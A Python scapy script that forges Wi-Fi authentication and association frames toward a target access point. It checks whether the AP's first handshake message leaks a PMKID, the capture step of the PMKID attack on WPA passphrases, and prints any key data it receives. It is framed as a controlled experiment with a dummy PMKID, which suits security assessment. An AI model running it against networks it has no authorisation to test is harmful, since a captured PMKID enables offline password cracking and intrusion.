#!/usr/bin/env python3
"""Clean-room PMKID cross-check, controlled two-arm experiment.

Gate 2 of the PMKID attack is: given a station that associates with an RSN IE
advertising PMKID caching (PMKID Count >= 1), will the AP's EAPOL message 1
come back carrying a PMKID KDE (OUI 00:0f:ac, type 04)?

hcxdumptool is the usual tool for this, but on this host/driver it never
completed its own association, so we craft the exchange ourselves. That makes a
control arm essential -- otherwise "no M1" and "no PMKID" are indistinguishable
from "our frame was malformed".

  ARM A (control): association request with a normal RSN IE, no PMKID.
                   If this cannot produce M1, our crafting is at fault and
                   nothing from ARM B means anything.

  ARM B (test):    same request, but with PMKID Count = 1 and a PMKID list.
                   If M1 comes back with key_data_len == 0, gate 2 fails on
                   this AP. If a PMKID KDE comes back, gate 2 passes.

Each arm uses a fresh random MAC so the AP's per-station state from a previous
arm (or from an earlier hcxdumptool run) cannot leak into the result.

Nothing is cracked here; the PMKID used is a dummy value.

Usage:
    sudo python3 pmkid_inject_probe.py [iface] [bssid] [ssid] [channel]
"""

import random
import sys
import time

from scapy.all import (RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt,
                       EAPOL, sendp, AsyncSniffer)

IFACE = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
AP = sys.argv[2] if len(sys.argv) > 2 else "aa:bb:cc:dd:ee:ff"
SSID = sys.argv[3] if len(sys.argv) > 3 else "example-ap"
CHAN = sys.argv[4] if len(sys.argv) > 4 else "6"

DUMMY_PMKID = bytes(range(16))

RSN_PLAIN = (
    b"\x01\x00"            # RSN version 1
    b"\x00\x0f\xac\x04"    # group cipher: CCMP
    b"\x01\x00"            # pairwise count 1
    b"\x00\x0f\xac\x04"    # pairwise: CCMP
    b"\x01\x00"            # AKM count 1
    b"\x00\x0f\xac\x02"    # AKM: PSK
    b"\x00\x00"            # RSN capabilities
)

RSN_WITH_PMKID = RSN_PLAIN + b"\x01\x00" + DUMMY_PMKID

# state for the arm currently under test
CUR = {"mac": None, "frames": [], "m1": []}

# every EAPOL frame seen on the channel, whoever it belongs to -- proves whether
# the AP answers a crafted station at all, independent of our MAC filter
ALL_EAPOL = []


def rand_mac():
    """Locally-administered unicast MAC."""
    b = [random.randint(0, 255) for _ in range(6)]
    b[0] = (b[0] | 0x02) & 0xFE
    return ":".join("%02x" % x for x in b)


def on_frame(pkt):
    if not pkt.haslayer(Dot11):
        return
    d = pkt[Dot11]
    if pkt.haslayer(EAPOL):
        e = bytes(pkt[EAPOL])
        ki = int.from_bytes(e[5:7], "little") if len(e) >= 7 else -1
        ALL_EAPOL.append("%s -> %s key_info=0x%04x eapol_len=%d"
                         % (d.addr2, d.addr1, ki, len(e)))
    mac = CUR["mac"]
    if mac is None or (d.addr1 != mac and d.addr2 != mac):
        return

    st = d.subtype
    names = {0: "ASSOC-REQ", 1: "ASSOC-RESP", 2: "REASSOC-REQ",
             3: "REASSOC-RESP", 11: "AUTH", 12: "DEAUTH", 13: "ACTION"}
    if pkt.haslayer(EAPOL):
        tag = "EAPOL"
    else:
        tag = names.get(st, "subtype=%d" % st)

    extra = ""
    if pkt.haslayer("Dot11AssoResp"):
        extra = " status=%d" % pkt["Dot11AssoResp"].status
    if st == 11 and pkt.haslayer(Dot11Auth):
        extra = " alg=%d seq=%d status=%d" % (
            pkt[Dot11Auth].algo, pkt[Dot11Auth].seqnum, pkt[Dot11Auth].status)

    if pkt.haslayer(EAPOL):
        e = bytes(pkt[EAPOL])
        if len(e) >= 99:
            ki = int.from_bytes(e[5:7], "little")
            kdl = int.from_bytes(e[97:99], "little")
            kd = e[99:99 + kdl]
            found = b"\x00\x0f\xac\x04" in kd
            msg = {0x008a: "M1", 0x010a: "M2", 0x13ca: "M3", 0x030a: "M4"}.get(ki,
                                                                               "?")
            extra = ("  EAPOL-%s key_info=0x%04x key_data_len=%d PMKID_KDE=%s"
                     % (msg, ki, kdl, "FOUND" if found else "none"))
            extra += "  key_data=%s" % (kd.hex() if kd else "(empty)")
            if msg == "M1":
                CUR["m1"].append((ki, kdl, found, kd))

    line = "    [RX] %-11s %s -> %s%s" % (tag, d.addr2, d.addr1, extra)
    print(line, flush=True)
    CUR["frames"].append(line)


def run_arm(label, rsn_body):
    mac = rand_mac()
    CUR["mac"] = mac
    CUR["frames"] = []
    CUR["m1"] = []

    print("\n--- ARM %s (our MAC %s) ---" % (label, mac), flush=True)

    auth = (RadioTap() /
            Dot11(type=0, subtype=11, addr1=AP, addr2=mac, addr3=AP) /
            Dot11Auth(algo=0, seqnum=1, status=0))
    sendp(auth, iface=IFACE, verbose=False)
    time.sleep(2)

    assoc = (RadioTap() /
             Dot11(type=0, subtype=0, addr1=AP, addr2=mac, addr3=AP) /
             Dot11AssoReq(cap=0x0431, listen_interval=3) /
             Dot11Elt(ID=0, info=SSID.encode()) /
             Dot11Elt(ID=1, info=bytes([0x82, 0x84, 0x8b, 0x96])) /
             Dot11Elt(ID=50, info=bytes([0x0c, 0x18, 0x30, 0x60])) /
             Dot11Elt(ID=48, info=rsn_body))
    for _ in range(2):
        sendp(assoc, iface=IFACE, verbose=False)
        time.sleep(3)
    time.sleep(3)

    ok = any("ASSOC-RESP" in f and "status=0" in f for f in CUR["frames"])
    return {"label": label, "assoc_ok": ok, "m1": list(CUR["m1"])}


def main():
    print("[*] iface=%s  target=%s  ssid=%s  ch=%s" % (IFACE, AP, SSID, CHAN))
    sniffer = AsyncSniffer(iface=IFACE, prn=on_frame, store=False, monitor=True)
    sniffer.start()
    time.sleep(1)

    a = run_arm("A control (no PMKID)", RSN_PLAIN)
    b = run_arm("B test (PMKID Count=1)", RSN_WITH_PMKID)

    sniffer.stop()

    print("\n=============== VERDICT ===============")
    print("every EAPOL frame seen on ch%s during the run: %d" % (CHAN, len(ALL_EAPOL)))
    for line in ALL_EAPOL[:20]:
        print("    " + line)
    print()
    for r in (a, b):
        print("ARM %-24s assoc accepted: %s   M1 frames: %d"
              % (r["label"], r["assoc_ok"], len(r["m1"])))

    print()
    if not a["assoc_ok"]:
        print("CONTROL FAILED: the AP did not accept a plain association from our")
        print("crafted frames. Our framing is wrong -> ARM B proves nothing.")
        return
    if not a["m1"] and not b["m1"]:
        print("Association succeeded but NO M1 in either arm.")
        print("The AP accepts association yet does not start the 4-way handshake")
        print("against a crafted station. PMKID is unreadable this way;")
        print("inconclusive for gate 2.")
        return
    if not a["m1"]:
        print("Control arm got no M1 but the PMKID arm did -> suspicious,")
        print("re-run before drawing any conclusion.")
        return

    print("Control arm DID get M1 (our framing is sound).")
    if any(f for (_, _, f, _) in b["m1"]):
        print("ARM B: M1 carried a PMKID KDE -> GATE 2 PASSES on this AP.")
    elif b["m1"]:
        for (ki, kdl, found, kd) in b["m1"]:
            print("ARM B: M1 key_info=0x%04x key_data_len=%d PMKID_KDE=%s"
                  % (ki, kdl, "FOUND" if found else "none"))
        print("ARM B: M1 received with key_data_len=0 -> NO PMKID.")
        print("GATE 2 FAILS on this AP: it will not volunteer a PMKID even")
        print("when the station advertises PMKID caching.")
    else:
        print("ARM B got no M1 while control did -> adding the PMKID made the")
        print("AP stop the handshake. Gate 2 fails (no PMKID obtainable).")


if __name__ == "__main__":
    main()
